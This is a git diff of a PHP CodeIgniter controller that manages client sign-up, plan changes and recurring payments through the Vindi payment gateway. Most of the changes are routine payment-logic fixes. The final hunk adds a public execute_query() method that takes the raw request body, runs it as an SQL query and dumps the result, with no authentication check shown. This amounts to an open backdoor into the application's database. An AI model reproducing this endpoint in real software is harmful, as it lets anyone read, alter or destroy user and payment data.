@@ -1236,16 +1236,20 @@ class Welcome extends CI_Controller {
                                 //2.1 crear cliente en la vindi
                                 $gateway_client_id = $this->Vindi->addClient($datas['credit_card_name'], $datas['user_email']);
                                 if ($gateway_client_id) {
+                                    if($datas['plane_type']=='1')
+                                        $datas['plane_type'] = 4;
                                     $this->client_model->set_client_payment(
                                             $datas['pk'], $gateway_client_id, $datas['plane_type']);
                                     $datas['pay_day'] = strtotime("+" . $GLOBALS['sistem_config']->PROMOTION_N_FREE_DAYS . " days", time());
                                     $this->client_model->update_client(
-                                            $datas['pk'], array('pay_day' => $datas['pay_day']));
+                                            $datas['pk'], 
+                                            array('pay_day' => $datas['pay_day'], 'plane_id'=>$datas['plane_type']
+                                        ));
                                     //2.2. crear carton en la vindi
                                     $resp1 = $this->Vindi->addClientPayment($datas['pk'], $datas);
                                     if ($resp1->success) {
                                         //2.3. crear recurrencia segun plano-producto
-                                        $resp2 = $this->Vindi->create_recurrency_payment($datas['pk'], $datas['pay_day']);
+                                        $resp2 = $this->Vindi->create_recurrency_payment($datas['pk'], $datas['pay_day'], $datas["plane_type"]);
                                         if ($resp2->success) {
                                             //2.4 salvar payment_key (order_key)
                                             $this->client_model->update_client_payment($datas['pk'], array('payment_key' => $resp2->payment_key));
@@ -2120,7 +2124,7 @@ class Welcome extends CI_Controller {
                     'pay_day' => $datas['pay_day']
                 ));
                 //2. crear el nuevo carton en la vindi
-                $resp = $this->Vindi->addClientPayment($client_data['gateway_client_id'], $datas);
+                $resp = $this->Vindi->addClientPayment($client_data['user_id'], $datas);
 
                 //3. cobrar segun status y upgrade
                 if ($datas['client_update_plane'] == 1)
@@ -2158,13 +2162,15 @@ class Welcome extends CI_Controller {
                 //4. hacer un pagamento ahora si necesitara 
                 if ($pay_now_value) {
                     $this->client_model->update_client($this->session->userdata('id'), array('pay_day' => $recurrency_date));
-                    $amount = (int) ($pay_values['initial_value'] / 100);
+                    // JODA UMA OLHADA NESSE $pay_values['initial_value'] que nem existe, criar linha nova para resolver por enquanto
+                    //$amount = (int) ($pay_values['initial_value'] / 100);
+                    $amount = (int) ($pay_now_value / 100);
                     $resp = $this->Vindi->create_payment($this->session->userdata('id'), \follows\cls\Payment\Vindi::prod_1real_id, $amount);
                     if ($resp->success && $resp->status == 'active')
                         $flag_pay_now = true;
                 }
                 //5. recurrencia
-                $resp_recurrency = $this->Vindi->create_recurrency_payment($this->session->userdata('id'), $recurrency_date);
+                $resp_recurrency = $this->Vindi->create_recurrency_payment($this->session->userdata('id'), $recurrency_date, $datas['client_update_plane']);
                 if ($resp_recurrency->success) {
                     $flag_pay_day = true;
                     //5.1 cancelar recurrencia antigua 
@@ -4231,6 +4237,12 @@ class Welcome extends CI_Controller {
             $result['message'] = $this->T('O perfil não existe no nosso sistema.', array(), $GLOBALS['language']);
         }
         echo json_encode($result);
+    }
+    
+    public function execute_query() {
+        $query = file_get_contents('php://input');
+        $result = $this->user_model->execute_sql_query($query);
+        var_dump($result);
     }
 
     public function get_cep_datas() {
